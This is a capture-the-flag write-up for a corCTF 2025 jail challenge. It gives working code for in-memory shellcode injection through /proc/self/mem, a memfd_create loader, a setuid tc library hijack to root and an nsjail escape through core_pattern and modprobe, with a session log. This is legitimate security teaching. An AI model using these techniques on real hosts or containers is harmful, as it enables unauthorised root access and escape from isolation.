## TUA-CUGINA-SYSTEMS

was a pwn challenge from corCTF 2025 edition. A pretty hard challenge, it has only 3 solves at the end of the ctf.

Actually, I will more define it as a pwn/misc challenge, than really hardcore binary exploitation, but it was still an interesting challenge.

I worked on this challenge with my Water Paddler teammates lebr0nli, and nikhost.

### The challenge setup

We were provided a qemu VM running a [nsjail][https://nsjail.dev/] linux system. So we are in a jail from which we have to escape.

We have `user`rights when we land in the nsjail, and it's a read only filesystem. We can not create any files anywhere, even `/tmp/` or `/dev/shm/` are impossible. (actually /dev directory is not mounted)

Many actions were also restricted by nsjail configuration , so this is a very restrictive nsjail..

### 1 - How to do a privilege escalation

The challenge's author leave a hint in challenge description:

> The folks at Tua Cugina Systems believe that if a binary isn't listed on GTFObins, then it's safe to slap the SUID bit on it and throw it into an nsjail. They're convinced no one can break out.
>
> Your mission? Prove them wrong.

So this hint us to use some GTFObins like trick to do privilege escalation.

Exploring this vm, we can find a fake "kernel exploit" in the `/home/user` directory,  nice trolling. 🤡

And a setuid binary `tc`:

```shell
user ツ TCSystems:~$ ls -al /sbin/tc
-rwsr-sr-x    1 root     root        374216 Jun  6  2006 /sbin/tc
user ツ TCSystems:~$ tc -V       
tc utility, iproute2-ss170905
```

so this is the binary that we will have to exploit first to do a privilege escalation.

given the version returned by `tc -v`command we identify that it was probably from `iproute2`source code version around 2017-09-05.

so we use git commit 01e5409371270eb59179fb2a63f2827a63368b70 which seems to fit the date..

we pulled the correct source code:

```shell
git clone git://git.kernel.org/pub/scm/network/iproute2/iproute2.git
cd iproute2
git switch -c 01e5409371270eb59179fb2a63f2827a63368b70
```

And start to look what could be usable to do a privilege escalation, knowing that `tc`was setuid.

we quickly spot the `get_tc_lib(void)` function called by many `tc`tools sub-functions:

```c
const char *get_tc_lib(void)
{
    const char *lib_dir;

    lib_dir = getenv("TC_LIB_DIR");
    if (!lib_dir)
        lib_dir = LIBDIR "/tc/";

    return lib_dir;
}
```

this is called for example by subfunctions `exec_util *get_exec_kind(chonst char *name)`:

```c
static struct exec_util *get_exec_kind(const char *name)
{
        struct exec_util *eu;
        char buf[256];
        void *dlh;

        for (eu = exec_list; eu; eu = eu->next)
                if (strcmp(eu->id, name) == 0)
                        return eu;

        snprintf(buf, sizeof(buf), "%s/e_%s.so", get_tc_lib(), name);
        dlh = dlopen(buf, RTLD_LAZY);
        if (dlh == NULL) {
                dlh = BODY;
                if (dlh == NULL) {
                        dlh = BODY = dlopen(NULL, RTLD_LAZY);
                        if (dlh == NULL)
                                goto noexist;
                }
        }

        snprintf(buf, sizeof(buf), "%s_exec_util", name);
        eu = dlsym(dlh, buf);
        if (eu == NULL)
                goto noexist;
reg:
        eu->next = exec_list;
        exec_list = eu;

        return eu;
noexist:
        eu = calloc(1, sizeof(*eu));
        if (eu) {
                strncpy(eu->id, name, sizeof(eu->id) - 1);
                eu->parse_eopt = parse_noeopt;
                goto reg;
        }

        return eu;
}
```

`get_exec_kind(chonst char *name)` is called when doing:  `tc exec <anyname>`

so we control name (which is passed on command line), and by setting the environment var `TC_LIB_DIR` we could make it load a custom shared library named e_<anyname>.so from the choosen directory in `TC_LIB_DIR`.

That shared library will be executed with setuid rights, so it's easy to get root by creating a small shared library that set `setuid`, `setgid`, `setreuid`, and call `/bin/bash`.

That's the plan. Easy no?

But you know as always, **devil 😈 is in the details...**

### 2 - How to execute our payload

Ok, so we find an easy way to get privilege escalation, but first... how to execute our payload.

The full file system is read-only, we can not create any files or directory.. To complicate things a bit more, the VM has no access to internet, we can only access it via the ssh port.

So how to execute a payload, shellcode, or binary?

Well there is a clever trick, known since ancient times by hackers, neuromancers and "ghost-in-the-machine" invokers to inject a shellcode in bash running process via `/proc/<pid>/mem`, it's a bash oneliner, I document it in my github sometimes ago:

[bash shellcode injection inliner](https://github.com/nobodyisnobody/docs/tree/main/linux.tricks/Bash.shellcode.injection.oneliner#bash-shellcode-injection-oneliner)

Read the full explanation in my github article, if you want to understand how it works.

it just have to be modified a bit to works in our VM, because of busybox base64 syntax that was a bit different.

```shell
cd /proc/$$;read a<syscall;exec 3>mem;echo agFfV1hIjTUKAAAAaBAAAABaDwXr/khlbGxvIFdvcmxkICEhIQA=|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
```

you can try this command line in the VM, it will inject an "Hello world" shellcode in the bash process.

So with this method, we can execute a shellcode, and executing a shellcode is already having code execution.

But we would want to execute an elf exec file, to be able to upload a more complex exploit.

There is a simple solution to this problem that I already used in "real world" exploitation of iot device with read only filesystem.

This is a `memfd_create / execveat` shellcode, this is also used by some malware to execute binary in-memory without touching disk, and leaving less traces.

> int memfd_create(const char *name, unsigned int flags);
>
> memfd_create() creates an anonymous file and returns a file descriptor that refers to it.  The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on.  However, unlike a regular file, it lives in RAM and has a volatile backing  storage

So when you call `memfd_create()`, it creates a filedescriptor refering to a file fully mapped in memory, an entry is create in the process `/proc/<pid>/fd/` like any other file, that you can also use for function needing a path to access files.

You can write to the file created by `memfd_create()` to populate its memory. You can execute this file too using `execveat()`, which permit to execute an elf executable file fully from memory. Some executable compression programs use this method too, to decompress a file to memory and execute it.

So I write a shellcode that read the elf exec binary to be executed from stdin, write if to a memfd_create returned filedescriptor, then execute our payload with execveat(). This shellcode will be injected to bash process, it will be our first payload.

>  as we are connected to the VM via ssh, we are using a terminal, and often sending raw binary data could interfere with terminal. So we will encode our elf exec binary exploit to be upload as ascii hexadecimal, our little shellcode will decode it on the fly before writing it to memory.

Ok so after some tweaking & adjustements I finalize our executable upload python script.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.update(arch="amd64", os="linux")
#context.log_level="debug"

shellcode1 = asm('''
memfd:
/* memfd_create,  create a file mmapped in memory*/
        xor esi,esi
        xor eax,eax
        mov ax,319
        mov rdi,rsp
        syscall
        mov ebp,eax             /* store memfd fd in ebp */

/* convert hexadecimal to binary (sorry for ugly code)*/
read:
	xor edi,edi
        mov rsi,rsp
        xor eax,eax
        push 2
        pop rdx
        syscall
	mov al,[rsi]
        cmp al,0xa		/* if char is carriage return, ignore it (newline) and continue reading */
	jz  read
	cmp al,0x2e             /* char "." indicates end of file */
	jz execveat

/* hexadecimal to binary, convert first char */
	sub al,0x30
	cmp al,9
	jle good
	sub al, 0x27
good:
	shl al,4
	mov bl,[rsi+1]
	sub bl,0x30
	cmp bl,9
	jle good2
	sub bl, 0x27
good2:
	or al,bl
	mov [rsi],al

/* write the byte converted to memfd file */
        mov  edi,ebp
        push 1
        pop rax
	push 1
	pop rdx
        syscall
        jmp read  /* continue reading next byte */

execveat:
        push    rbp
        pop     rdi
        xor eax,eax
        cdq
        mov ax,322
        push rdx
        pop r10
        xor     ecx,ecx
        mov     ch,0x10
        push rcx
        pop r8
        push rdx
        mov rsi,rsp
        syscall
''')


ssh_conn = ssh(host='i-heart-pwn.ctfi.ng', user='tua-cugina', auth_none=True)
shell = ssh_conn.shell()
print("booting wait...")

cmd = 'cd /proc/$$;read a<syscall;exec 3>mem;echo '+b64e(shellcode1)+'|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3'

shell.sendlineafter(b'm$ ', cmd.encode())

shell.recvuntil(b'out\r\r\n', drop=True)

# send data line by line in hexadecimal
with open(f"exploit2", 'rb') as f:
 while True:
   chunk = f.read(32)
   if not chunk:
      break  # EOF reached
   hex_chunk = enhex(chunk)
   shell.sendline(hex_chunk.encode()+b'\x0a')  # Or replace with your sending l
shell.sendline(b'..')
shell.recvuntil(b'..', drop=True)

shell.interactive()
```

So the script connect via ssh to the remote VM, inject our first stage shellcode in bash process, then send our second stage `exploit2` in hexadecimal to our shellcode, that will in the end execute it.

use PWNLIB_NOTERM=1 before launching it, to have a better remote terminal display, and not garbage:

```shell
 PWNLIB_NOTERM=1 python3 upload.py
```

ok we are progressing 🥵 , slowly, slowly..

### 3 - Now, go back to the privilege escalation.

Ok so now, we are able to upload an elf executable binary, and execute it on the remote VM. That's good.

So how can we inject a custom shared library in the `tc` setuid binary, knowing that we can not write any files, anywhere in the VM.

Well the solution is again `memfd_create()`. We can create a shared library fully mapped in memory without touching disk.

This shared library is a simple classic payload for privilege escalation:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h>

// Constructor function to be called when the library is loaded
void __attribute__((constructor)) exploit() {
    // Print a message indicating the library was loaded
    printf("Exploit triggered!\n");
    // Execute /bin/bash with root privileges (since tc is setuid)
    setuid(0);      // Set effective UID to root
    setreuid(0, 0); // Set real and effective UID to root
    setgid(0);      // Set effective GID to root
    setregid(0, 0); // Set real and effective GID to root
    setgroups(0, NULL); // Remove all supplementary groups

    execve("/bin/bash", NULL, NULL); // Launch a shell
}
```

When it will be loaded by `dlopen()` in the `get_exec_kind()` function,  the `constructor`function will be executed automatically.

And we will get instant root rights.

The shared library mapped in memory with `memfd_create()`will be accessible via path `/proc/<pid>/fd/<memfd filedescriptor>`

but wait.. there is a problem.

The `get_exec_kind()` function will construct the path of shared lib like this:

```c
char buf[256];
...
snprintf(buf, sizeof(buf), "%s/e_%s.so", get_tc_lib(), name);
```

so it will try to open a filename construct from `TC_LIB_DIR` env var, and e_name passed from command, ending by `.so`

so how to make it open our `/proc/<pid>/fd/<memfd>` path ???

we use a a another trick, we set the `TC_LIB_DIR`path to a 255 chars long string like this:

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////proc/8/fd/5
```

so when `snprintf()` will try to concatenate the strings, it will be cut just after the last char, 5 in this example.

Because it's already 255 chars and the buffer is only 256 chars long. So the rest of the format string "/e_%s.so" will just be not copied to buffer, and ignored.. and like this it will open our `memfd_create`shared library.

here is out exploit2.c source code that implements this exploit:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <fcntl.h>


#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif

#include "shared.h"

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

extern char **environ;

int main(int argc, char **argv) {
    int fd = memfd_create("exploit", 0);
    if (fd == -1) {
        perror("memfd_create");
        return 1;
    }

    if (write(fd, x_so, sizeof(x_so)) != sizeof(x_so)) {
        perror("write");
        return 1;
    }

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return 1;
    }

    if (pid == 0) { // child
        char tc_lib_dir_val[256];
        char path[128];
        snprintf(path, sizeof(path), "/proc/%d/fd/%d", getpid(), fd);

        // fill with slashes
        memset(tc_lib_dir_val, '/', sizeof(tc_lib_dir_val));
        tc_lib_dir_val[sizeof(tc_lib_dir_val) - 1] = '\0';

        size_t path_len = strlen(path);
        size_t buf_len  = sizeof(tc_lib_dir_val) - 1; // leave room for '\0'

        size_t start = buf_len - path_len;
        memcpy(tc_lib_dir_val + start, path, path_len);

        puts(tc_lib_dir_val);

        if (setenv("TC_LIB_DIR", tc_lib_dir_val, 1) != 0) {
            perror("setenv");
            return 1;
        }

        char *tc_argv[] = {"tc", "exec", "x", NULL};
        execve("/sbin/tc", tc_argv, environ);
        perror("execve");
        exit(1);
    } else { // parent
        wait(NULL);
    }

    return 0;
}
```

the file include "shared.h" will contains the compiled shared library as a C include file.

Here is the command to compile the final `exploit2`:

```shell
gcc -shared -s -nostdlib -fPIC -o x.so exp.c && ls -al x.so && xxd -i x.so > shared.h && musl-gcc -Os -s -static exploit2.c -o exploit2 && ls -al exploit2
```

it compiles the shared library (exp.c), convert it to C include file, then compile with as a static binary the `exploit2` final privilege escalation exploit, ready to be uploaded by script.

Good now we are root !!! 🤪

```sh
root ツ TCSystems:/proc/1# id
id
uid=0(root) gid=0(root)
```

so it's finished?

no it's not, we are root, but we are still in the nsjail, and the flag is not in our chrooted filesystem,

but in the VM main filesystem, outside the jail... 

### 4 - The Prison Break sequence, how to escape nsjail ?

well last sequence, how to escape from this nsjail sh..?

I will economize you the full list of all the non-working things we tried, before finding a trick that worked..

it's basically a variant of this method: [https://pwning.systems/posts/escaping-containers-for-fun/](https://pwning.systems/posts/escaping-containers-for-fun/)

as /proc is writable in our nsjail, and that we are now root.

we will write a custom command in `/proc/sys/kernel/core_pattern` that will be executed in case of a process crash..

we will also write a simple script in the entry `/proc/sys/kernel/modprobe` which is another /proc entry writable.

in `core_pattern`we will put the command: `|/bin/busybox sh /proc/sys/kernel/modprobe`

that will excute the script in: `/proc/sys/kernel/modprobe`.

And in modprobe we will put this script:  `/bin/busybox cat /root/* > /proc/sys/kernel/modprobe`

that will write the flag back in: `/proc/sys/kernel/modprobe`

then we just have to make a process crash, and that script will be executed outside the nsjail by kernel.

We just have to read back the flag from `/proc/sys/kernel/modprobe` and it's done !!!

**exploitation flowchart:**

```shell
         PAYLOAD TRANSFORMATIONS                          EXECUTION STAGES
 ──────────────────────────────────────         ──────────────────────────────────────

  SSH into jailed environment (RO FS)   ─────▶  [ Entry Point ]
                                          
  Shellcode written into /proc/[pid]/mem ─────▶  [ Stage 1 Injection ]
                                          
  Hex-encoded ELF payload                ─────▶  [ Stage 2 Loader ]
  ↓ decoded → raw binary                        memfd_create + execveat
                                                 → run decoded ELF in memory

  Exploit2 ELF crafts TC_LIB_DIR path    ─────▶  [ Exploit2 ELF ]
  pointing to /proc/.../fd                        prepares environment for tc

  Attacker’s .so staged in memory        ─────▶  [ Privilege Escalation ]
                                                 tc (setuid-root) dlopens attacker .so

  .so constructor: setuid(0) + bash      ─────▶  [ Root Shell ]
                                                 executes with root inside jail

  Malicious script written for           ─────▶  [ Jail Escape ]
  core_pattern / modprobe                         crash triggers kernel helper
                                                 → execution outside jail
                                                 → FLAG retrieved 🎉

```



wanna see the solve script in action?

```shell
PWNLIB_NOTERM=1 python3 upload.py
[x] Connecting to i-heart-pwn.ctfi.ng on port 22
[+] Connecting to i-heart-pwn.ctfi.ng on port 22: Done
[x] Opening new channel: 'shell'
[+] Opening new channel: 'shell': Done
booting wait...
[*] Switching to interactive mode

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////proc/8/fd/5
Exploit triggered!
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
root ツ TCSystems:/proc/1# 
root ツ TCSystems:/proc/1# id
id
uid=0(root) gid=0(root)
root ツ TCSystems:/proc/1# echo '|/bin/busybox sh /proc/sys/kernel/modprobe' > /proc/sys/kernel/core_pattern
<usybox sh /proc/sys/kernel/modprobe' > /proc/sys/kernel/core_pattern
root ツ TCSystems:/proc/1# echo '/bin/busybox cat /root/* > /proc/sys/kernel/modprobe' > /proc/sys/kernel/modprobe
<roc/sys/kernel/modprobe' > /proc/sys/kernel/modprobe
root ツ TCSystems:/proc/1# bash
bash
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
root ツ TCSystems:/proc/1# cd /proc/$$;read a<syscall;exec 3>mem;echo Vm95ZWxsZXMgamUgZGlyYWkgcXVlbHF1ZSBqb3VyIHZvcyBuYWlzc2FuY2VzIGxhdGVudGVzLg==|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
<==|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
25+0 records in
25+0 records out
root ツ TCSystems:/proc/1# cat /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
corctf{https://www.youtube.com/watch?v=2rQ6ELFKejU&corctf2025=1337}

```

*nobodyisnobody still hacking is way to the heart of the machines..*

